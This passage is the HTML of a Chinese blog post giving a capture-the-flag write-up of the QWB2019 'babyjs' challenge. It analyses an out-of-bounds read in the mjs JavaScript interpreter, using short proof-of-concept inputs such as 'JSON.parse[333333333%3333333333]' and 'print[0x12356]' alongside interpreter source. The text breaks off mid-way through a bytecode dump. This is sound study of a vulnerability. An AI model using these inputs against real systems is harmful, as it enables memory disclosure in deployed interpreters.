@@ -1,0 +1,853 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+
+  
+    
+    
+    <link href="https://fonts.loli.net/css?family=Comic Neue:300,300italic,400,400italic,700,700italic|Comic Neue:300,300italic,400,400italic,700,700italic|Comic Neue:300,300italic,400,400italic,700,700italic|Comic Neue:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/x32.ico?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/x16.ico?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT">
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="ditto's blog" type="application/atom+xml">
+
+
+
+
+
+
+<meta name="description" content="前言之前看过的一道题，因为想知道js解释器的工作原理，就读了读源码，后来看了v8，这道题就太监了 … 参考了: 强网杯babyjs poc分析issue：AddressSanitizer: invalid READ at mjs.c:9644 参考文章中给出了github上的poc: 123let s ;let o = (s);let z = JSON.parse[333333333%333333">
+<meta property="og:type" content="article">
+<meta property="og:title" content="QWB2019-babyjs">
+<meta property="og:url" content="http://yoursite.com/2019/09/03/QWB2019-babyjs/index.html">
+<meta property="og:site_name" content="ditto&#39;s blog">
+<meta property="og:description" content="前言之前看过的一道题，因为想知道js解释器的工作原理，就读了读源码，后来看了v8，这道题就太监了 … 参考了: 强网杯babyjs poc分析issue：AddressSanitizer: invalid READ at mjs.c:9644 参考文章中给出了github上的poc: 123let s ;let o = (s);let z = JSON.parse[333333333%333333">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://yoursite.com/2019/09/03/QWB2019-babyjs/1.png">
+<meta property="og:image" content="http://yoursite.com/2019/09/03/QWB2019-babyjs/3.png">
+<meta property="og:image" content="http://yoursite.com/2019/09/03/QWB2019-babyjs/4.png">
+<meta property="og:updated_time" content="2019-09-03T11:53:55.125Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="QWB2019-babyjs">
+<meta name="twitter:description" content="前言之前看过的一道题，因为想知道js解释器的工作原理，就读了读源码，后来看了v8，这道题就太监了 … 参考了: 强网杯babyjs poc分析issue：AddressSanitizer: invalid READ at mjs.c:9644 参考文章中给出了github上的poc: 123let s ;let o = (s);let z = JSON.parse[333333333%333333">
+<meta name="twitter:image" content="http://yoursite.com/2019/09/03/QWB2019-babyjs/1.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/09/03/QWB2019-babyjs/">
+
+
+
+
+
+  <title>QWB2019-babyjs | ditto's blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">ditto's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-sitemap">
+          <a href="/sitemap.xml" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br>
+            
+            站点地图
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/09/03/QWB2019-babyjs/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="ditto">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/my.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ditto's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">QWB2019-babyjs</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-09-03T09:22:48+08:00">
+                2019-09-03
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  2k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  10
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>之前看过的一道题，因为想知道js解释器的工作原理，就读了读源码，后来看了v8，这道题就太监了 …</p>
+<p>参考了: <a href="https://xz.aliyun.com/t/5279" target="_blank" rel="noopener">强网杯babyjs</a></p>
+<h3 id="poc分析"><a href="#poc分析" class="headerlink" title="poc分析"></a>poc分析</h3><p><a href="https://github.com/cesanta/mjs/issues/114" target="_blank" rel="noopener">issue：AddressSanitizer: invalid READ at mjs.c:9644</a></p>
+<p>参考文章中给出了github上的poc:</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> s ;</span><br><span class="line"><span class="keyword">let</span> o = (s);</span><br><span class="line"><span class="keyword">let</span> z = <span class="built_in">JSON</span>.parse[<span class="number">333333333</span>%<span class="number">3333333333</span>] === <span class="string">'xx'</span></span><br></pre></td></tr></table></figure>
+<p>运行poc可以发现在<code>getprop_builtin_foreign</code>中存在越界访问:<br><img src="/2019/09/03/QWB2019-babyjs/1.png" alt=""><br>其中RSI为输入的index，就是333333333%3333333333 , RAX为基地址。</p>
+<h3 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h3><h4 id="mjs对象的构成"><a href="#mjs对象的构成" class="headerlink" title="mjs对象的构成:"></a>mjs对象的构成:</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mjs_property</span> &#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">mjs_property</span> *<span class="title">next</span>;</span> <span class="comment">/* Linkage in struct mjs_object::properties */</span></span><br><span class="line">  <span class="keyword">mjs_val_t</span> name;            <span class="comment">/* Property name (a string) */</span></span><br><span class="line">  <span class="keyword">mjs_val_t</span> value;           <span class="comment">/* Property value */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mjs_object</span> &#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">mjs_property</span> *<span class="title">properties</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p>属性通过链表串起来，属性中保存的有name和value，name及为属性的名称，value即为该属性所对应的值</p>
+<h4 id="mjs如何区分各类对象"><a href="#mjs如何区分各类对象" class="headerlink" title="mjs如何区分各类对象:"></a>mjs如何区分各类对象:</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * A tag is made of the sign bit and the 4 lower order bits of byte 6.</span></span><br><span class="line"><span class="comment"> * So in total we have 32 possible tags.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Tag (1,0) however cannot hold a zero payload otherwise it's interpreted as an</span></span><br><span class="line"><span class="comment"> * INFINITY; for simplicity we're just not going to use that combination.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAKE_TAG(s, t) \</span></span><br><span class="line">  ((<span class="keyword">uint64_t</span>)(s) &lt;&lt; <span class="number">63</span> | (<span class="keyword">uint64_t</span>) <span class="number">0x7ff0</span> &lt;&lt; <span class="number">48</span> | (<span class="keyword">uint64_t</span>)(t) &lt;&lt; <span class="number">48</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MJS_TAG_OBJECT MAKE_TAG(1, 1)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MJS_TAG_FOREIGN MAKE_TAG(1, 2)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MJS_TAG_UNDEFINED MAKE_TAG(1, 3)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MJS_TAG_BOOLEAN MAKE_TAG(1, 4)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MJS_TAG_NAN MAKE_TAG(1, 5)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MJS_TAG_STRING_I MAKE_TAG(1, 6)  <span class="comment">/* Inlined string len &lt; 5 */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MJS_TAG_STRING_5 MAKE_TAG(1, 7)  <span class="comment">/* Inlined string len 5 */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MJS_TAG_STRING_O MAKE_TAG(1, 8)  <span class="comment">/* Owned string */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MJS_TAG_STRING_F MAKE_TAG(1, 9)  <span class="comment">/* Foreign string */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MJS_TAG_STRING_C MAKE_TAG(1, 10) <span class="comment">/* String chunk */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MJS_TAG_STRING_D MAKE_TAG(1, 11) <span class="comment">/* Dictionary string  */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MJS_TAG_ARRAY MAKE_TAG(1, 12)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MJS_TAG_FUNCTION MAKE_TAG(1, 13)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MJS_TAG_FUNCTION_FFI MAKE_TAG(1, 14)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MJS_TAG_NULL MAKE_TAG(1, 15)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*'0xffff000000000000' */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MJS_TAG_MASK MAKE_TAG(1, 15)</span></span><br></pre></td></tr></table></figure>
+<p>这里的tag是用来区分创建的对象的，通过在地址的高16位设置flag来区分是什么类型对象，通过与或操作来将flag置位或复位。</p>
+<h4 id="分析关键代码"><a href="#分析关键代码" class="headerlink" title="分析关键代码"></a>分析关键代码</h4><p>通过引用找到调用getprop_builtin_foreign的地方:</p>
+<p>在解析字节码OP_GET这里调用了<code>getprop_builtin</code>，通过读源码及调试得知OP_GET是获得object某个属性值的操作.<br>obj为被load的obj，key为属性名<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> OP_GET: &#123;</span><br><span class="line">  <span class="keyword">mjs_val_t</span> obj = mjs_pop(mjs);</span><br><span class="line">  <span class="keyword">mjs_val_t</span> key = mjs_pop(mjs);</span><br><span class="line">  <span class="keyword">mjs_val_t</span> val = MJS_UNDEFINED;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!getprop_builtin(mjs, obj, key, &amp;val)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (mjs_is_object(obj)) &#123;</span><br><span class="line">      val = mjs_get_v_proto(mjs, obj, key);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      mjs_prepend_errorf(mjs, MJS_TYPE_ERROR, <span class="string">"type error"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  mjs_push(mjs, val);</span><br></pre></td></tr></table></figure></p>
+<p><code>getprop_builtin</code>中调用了<code>getprop_builtin_foreign</code><br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">getprop_builtin</span><span class="params">(struct mjs *mjs, <span class="keyword">mjs_val_t</span> val, <span class="keyword">mjs_val_t</span> name,</span></span></span><br><span class="line"><span class="function"><span class="params">                           <span class="keyword">mjs_val_t</span> *res)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> n;</span><br><span class="line">  <span class="keyword">char</span> *s = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="keyword">int</span> need_free = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">int</span> handled = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">mjs_err_t</span> err = mjs_to_string(mjs, &amp;name, &amp;s, &amp;n, &amp;need_free);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (err == MJS_OK) &#123;</span><br><span class="line">    <span class="keyword">if</span> (mjs_is_string(val)) &#123;</span><br><span class="line">      handled = getprop_builtin_string(mjs, val, s, n, res);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (s != <span class="literal">NULL</span> &amp;&amp; n == <span class="number">5</span> &amp;&amp; <span class="built_in">strncmp</span>(s, <span class="string">"apply"</span>, n) == <span class="number">0</span>) &#123;</span><br><span class="line">      *res = mjs_mk_foreign_func(mjs, (<span class="keyword">mjs_func_ptr_t</span>) mjs_apply_);</span><br><span class="line">      handled = <span class="number">1</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (mjs_is_array(val)) &#123;</span><br><span class="line">      handled = getprop_builtin_array(mjs, val, s, n, res);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (mjs_is_foreign(val)) &#123;</span><br><span class="line">      handled = getprop_builtin_foreign(mjs, val, s, n, res);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></p>
+<p><code>getprop_builtin</code>这里先对传入的obj做类型判断,如果是string，array，foreign类型对象中的builtin属性，则直接取其value，如果都不是则return 0，进入外层函数后调用<code>mjs_get_v_proto</code>，进行普通的load属性操作<br><figure class="highlight ceylon"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (mjs<span class="number">_</span><span class="keyword">is</span><span class="number">_</span><span class="keyword">object</span>(obj)) &#123;</span><br><span class="line">  val = mjs<span class="number">_</span>get<span class="number">_</span>v<span class="number">_p</span>roto(mjs, obj, key);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  mjs<span class="number">_p</span>repend<span class="number">_</span>errorf(mjs, MJS<span class="number">_T</span>YPE<span class="number">_</span>ERROR, <span class="string">"type error"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p><code>mjs_get_v_proto</code>的定义如下:<br><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mjs_val_t mjs_get_v_proto(<span class="name">struct</span> mjs *mjs, mjs_val_t obj, mjs_val_t key) &#123;</span><br><span class="line">  struct mjs_property *p<span class="comment">;</span></span><br><span class="line">  mjs_val_t pn = mjs_mk_string(<span class="name">mjs</span>, MJS_PROTO_PROP_NAME, ~<span class="number">0</span>, <span class="number">1</span>)<span class="comment">;</span></span><br><span class="line">  if ((<span class="name">p</span> = mjs_get_own_property_v(<span class="name">mjs</span>, obj, key)) != NULL) return p-&gt;value<span class="comment">;</span></span><br><span class="line">  if ((<span class="name">p</span> = mjs_get_own_property_v(<span class="name">mjs</span>, obj, pn)) == NULL) return MJS_UNDEFINED<span class="comment">;</span></span><br><span class="line">  return mjs_get_v_proto(<span class="name">mjs</span>, p-&gt;value, key)<span class="comment">;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>遍历该obj的属性链表，如果找到了则返回其value。</p>
+<p><code>getprop_builtin_foreign</code>函数定义如下:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">getprop_builtin_foreign</span><span class="params">(struct mjs *mjs, <span class="keyword">mjs_val_t</span> val,</span></span></span><br><span class="line"><span class="function"><span class="params">                                   <span class="keyword">const</span> <span class="keyword">char</span> *name, <span class="keyword">size_t</span> name_len,</span></span></span><br><span class="line"><span class="function"><span class="params">                                   <span class="keyword">mjs_val_t</span> *res)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> isnum = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">int</span> idx = cstr_to_ulong(name, name_len, &amp;isnum);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!isnum) &#123;</span><br><span class="line">    mjs_prepend_errorf(mjs, MJS_TYPE_ERROR, <span class="string">"index must be a number"</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">uint8_t</span> *ptr = (<span class="keyword">uint8_t</span> *) mjs_get_ptr(mjs, val);</span><br><span class="line">    *res = mjs_mk_number(mjs, *(ptr + idx));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>将name字符串转化为整形数字，然后检查name字符串是否为数字，如果为数字则取(obj的地址+idx)位置的值为value,这里没有检查idx的范围，所以存在越界访问.</p>
+<h4 id="builtin的实现及漏洞"><a href="#builtin的实现及漏洞" class="headerlink" title="builtin的实现及漏洞"></a>builtin的实现及漏洞</h4><p>在mjs最开始初始化时，生成了一个全局对象，<code>mjs_set</code>将这些builtin包装成属性加入这个全局对象。当使用了这些builtin的时候就会在全局对象中查找.<br><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mjs_set(mjs, obj, <span class="string">"load"</span>, ~<span class="number">0</span>,</span><br><span class="line">        mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_load))<span class="comment">;</span></span><br><span class="line">mjs_set(mjs, obj, <span class="string">"print"</span>, ~<span class="number">0</span>,</span><br><span class="line">        mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_print))<span class="comment">;</span></span><br><span class="line">...</span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Populate JSON.parse() and JSON.stringify()</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">v = mjs_mk_object(mjs)<span class="comment">;</span></span><br><span class="line">mjs_set(mjs, v, <span class="string">"stringify"</span>, ~<span class="number">0</span>,</span><br><span class="line">        mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_op_json_stringify))<span class="comment">;</span></span><br><span class="line">mjs_set(mjs, v, <span class="string">"parse"</span>, ~<span class="number">0</span>,</span><br><span class="line">        mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_op_json_parse))<span class="comment">;</span></span><br><span class="line">mjs_set(mjs, obj, <span class="string">"JSON"</span>, ~<span class="number">0</span>, v)<span class="comment">;</span></span><br></pre></td></tr></table></figure></p>
+<p><code>mjs_mk_foreign_func</code>函数的定义如下:<br><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mjs_val_t mjs_mk_foreign_func(<span class="class"><span class="keyword">struct</span> <span class="title">mjs</span> *<span class="title">mjs</span>, <span class="title">mjs_func_ptr_t</span> <span class="title">fn</span>) &#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">    mjs_func_ptr_t fn;</span><br><span class="line">    void *p;</span><br><span class="line">  &#125; u;</span><br><span class="line">  u.fn = fn;</span><br><span class="line">  (void) mjs;</span><br><span class="line">  <span class="keyword">return</span> mjs_pointer_to_value(mjs, u.p) | MJS_TAG_FOREIGN;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p><code>mjs_mk_foreign_func</code>将这些函数的类型标记为 <code>MJS_TAG_FOREIGN</code>,这里就会出现问题.<br>这样就可以对这些builtin函数当做一个js对象进行load或者store操作，例如JSON.parse[0x123456].当解释OP_GET时就会调用<code>getprop_builtin_foreign</code>来进行越界读取. 不止是JSON.parse，只要是这些builtin函数都存在这些问题。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print[<span class="number">0x12356</span>]</span><br></pre></td></tr></table></figure>
+<p>这样也会造成越界读取<br><img src="/2019/09/03/QWB2019-babyjs/3.png" alt=""></p>
+<p>来看看正常array的创建及读取操作</p>
+<h4 id="array分析"><a href="#array分析" class="headerlink" title="array分析"></a>array分析</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br><span class="line">a[<span class="number">0</span>];</span><br></pre></td></tr></table></figure>
+<p>这段js代码生成的字节码如下:<br><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">mjs_util.<span class="string">c:</span><span class="number">228</span>                  <span class="number">0</span>   BCODE_HDR   [poc.js] <span class="string">end:</span><span class="number">59</span> <span class="string">map_offset:</span> <span class="number">54</span></span><br><span class="line">mjs_util.<span class="string">c:</span><span class="number">134</span>                  <span class="number">20</span>  PUSH_STR    [a]</span><br><span class="line">mjs_util.<span class="string">c:</span><span class="number">233</span>                  <span class="number">23</span>  PUSH_SCOPE</span><br><span class="line">mjs_util.<span class="string">c:</span><span class="number">233</span>                  <span class="number">24</span>  CREATE  </span><br><span class="line">mjs_util.<span class="string">c:</span><span class="number">134</span>                  <span class="number">25</span>  PUSH_STR    [a]</span><br><span class="line">mjs_util.<span class="string">c:</span><span class="number">233</span>                  <span class="number">28</span>  FIND_SCOPE</span><br><span class="line">mjs_util.<span class="string">c:</span><span class="number">233</span>                  <span class="number">29</span>  PUSH_ARRAY</span><br><span class="line">mjs_util.<span class="string">c:</span><span class="number">233</span>                  <span class="number">30</span>  DUP     </span><br><span class="line">mjs_util.<span class="string">c:</span><span class="number">117</span>                  <span class="number">31</span>  PUSH_INT    <span class="number">1</span></span><br><span class="line">mjs_util.<span class="string">c:</span><span class="number">233</span>                  <span class="number">33</span>  APPEND  </span><br><span class="line">mjs_util.<span 